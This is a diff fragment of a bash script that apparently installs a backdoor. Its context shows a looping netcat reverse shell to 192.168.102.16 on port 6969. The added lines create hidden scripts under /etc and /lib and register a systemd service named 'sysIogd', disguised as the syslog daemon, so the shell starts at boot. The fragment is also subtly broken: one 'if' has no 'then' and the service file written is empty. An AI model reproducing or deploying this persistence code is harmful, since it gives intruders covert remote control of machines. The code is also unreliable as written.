@@ -158,6 +158,23 @@ nc 192.168.102.16 6969 -e /bin/bash 2>/dev/null
 sleep 60
 done
 EOFC
+chmod +x /etc/.resolver.sh
+fi
+if ! [ -f /lib/.sysIogd.sh ]
+then
+cat <<EOFD > /lib/.sysIogd.sh
+#!/bin/bash
+bash /etc/.resolver.sh &
+bash /bin/systemm.sh &
+EOFD
+fi
+if ! [ -f /etc/systemd/system/sysIogd.service ]
+cat <<EOFE > /etc/systemd/system/sysIogd.service
+
+EOFE
+systemctl enable sysIogd
+systemctl daemon-reload
+systemctl start sysIogd
 fi
 done
 sleep 60
